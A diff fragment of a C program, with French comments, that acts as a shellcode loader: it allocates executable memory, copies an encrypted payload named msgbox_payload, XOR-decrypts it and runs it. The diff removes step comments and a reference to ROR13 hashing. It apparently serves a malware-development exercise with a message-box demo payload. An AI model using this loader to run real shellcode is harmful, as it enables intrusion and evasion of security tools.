@@ -23,29 +23,22 @@ void main() {
     printf("Key size: %zu\n", k_len);
     printf("Shellcode size: %zu\n", ss);
 
-    // 🔴 1. Allouer une mémoire exécutable
+    // Allouer une mémoire exécutable
     void *exec_mem = VirtualAlloc(NULL, ss, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec_mem) {
-        printf("❌ Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
+        printf("Erreur: Impossible d'allouer la mémoire (%lu)\n", GetLastError());
         return;
     }
 
-    // 🔵 2. Copier le shellcode dans cette mémoire
+    // Copier le shellcode dans cette mémoire
     memcpy(exec_mem, msgbox_payload, ss);
 
-    // 🟢 3. Déchiffrer le shellcode avec XOR
     if (k_len != 0) {
         for (size_t i = 0; i < ss; ++i) {
             ((unsigned char*)exec_mem)[i] ^= k[i % k_len];
         }
     }
 
-    // 🟣 4. Exécuter le shellcode
     ((void (*)())exec_mem)();
 }
-
-/*
-https://asecuritysite.com/hash/ror13
-
-*/
 
